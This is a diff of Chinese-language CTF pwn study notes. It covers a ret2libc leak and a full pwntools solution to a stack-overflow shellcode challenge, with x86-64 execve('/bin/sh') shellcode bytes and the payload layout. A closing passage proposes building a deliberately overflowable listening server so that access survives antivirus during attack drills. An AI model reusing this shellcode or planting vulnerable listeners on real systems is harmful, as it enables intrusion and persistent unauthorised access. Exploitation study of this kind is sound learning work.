@@ -47,7 +47,7 @@ int main(int argc, char **argv)
 可以看到虽然定义了success函数，但是并没有真正使用。
 
 ```
-gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
+gcc -m32 -fno-stack-protector stack_example.c -no-pie -o stack_example
 ```
 
 因为IDA的版权原因，下面用的是ghidra。
@@ -328,3 +328,58 @@ https://saku376.github.io/2021/04/30/%E9%80%9A%E8%BF%87GDB%E8%B0%83%E8%AF%95%E7%
 总结来说就是，GOT保存了程序中所要调用的函数的地址，运行一开时其表项为空，会在运行时实时的更新表项。一个符号调用在第一次时会解析出绝对地址更新到GOT中，第二次调用时就直接找到了GOT表项所存储的函数地址直接调用了。
 ```
 
+试着运行了一下代码，把匹配到的libc到试了一遍都没成功；在libc-database下get还报错，未解决，做一遍代码解读。
+
+<img src="./pwn.assets/image-20240524111219819.png" alt="image-20240524111219819" />
+
+通过ELF解析ret2libc3文件结构，并读取文件plt表中puts的位置，got表中main的位置，以及程序运行时的main函数位置。由于要对libc进行泄露，因此必须读got表；为了重复利用漏洞环境，所以puts_plt ret到了main函数中；这里有个疑问是为什么第一个地址用的是puts_plt而不是puts_got或puts本身，猜测可能是防止got表中还没有数据造成运行错误之类。最后泄露出了libc中main函数的位置。
+
+![image-20240524112722108](./pwn.assets/image-20240524112722108.png)
+
+根据泄露出的位置进行LibcSearcher读到libc的基址，并根据相对位置得到system函数和字符串/bin/sh，终了。
+
+
+
+#### 8、sniperoj-pwn100-shellcode-x86-64
+
+![image-20240524113815441](./pwn.assets/image-20240524113815441.png)
+
+PIE内存空间随机化。ghidra反编译后是read的栈溢出。
+
+![image-20240524114200821](./pwn.assets/image-20240524114200821.png)
+
+有个小问题是程序开了PIE保护，那反编译是肯定得不出shellcode跳转的地址的，好在代码里print了local18的地址，read的地址也正好是local18。
+
+shellcode长度最大值为0x40-0x10-rbp8-ret8=32，地址为local18 + 0x10 + 8 + 8
+
+![image-20240524153207698](./pwn.assets/image-20240524153207698.png)
+
+学习了在交互中读取字符串的方法。
+
+```
+#!/usr/bin/env python
+from pwn import *
+
+context.log_level = 'debug'
+sh = process('./sniperoj-pwn100-shellcode-x86-64')
+sh.recvuntil('[')
+buf_addr = sh.recvuntil(']', drop=True)
+print(buf_addr)
+shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+payload = b'A' * (0x10 + 8) + p64(int(buf_addr,16) + 0x10 + 8 + 8)  + shellcode
+# 计算可得填充字符数位112
+sh.sendlineafter('Now give me your answer : \n', payload)
+sh.interactive()
+```
+
+
+
+#### 突发奇想
+
+最近攻防演练的时候shell天天被杀，那我整个会溢出的代码，同时监听端口接受外面的数据，杀毒软件又将如何应对？
+
+我直接让gpt生成了一个回响服务器的代码，由于gets的交互不再试用，因此尝试通过strcpy作为溢出手段，但是直接加在原始代码当中变量有点多了，超出了我对程序的把控，决定再开一个函数进行cpy操作。
+
+![image-20240524165759536](./pwn.assets/image-20240524165759536.png)
+
+![image-20240524165456348](./pwn.assets/image-20240524165456348.png)
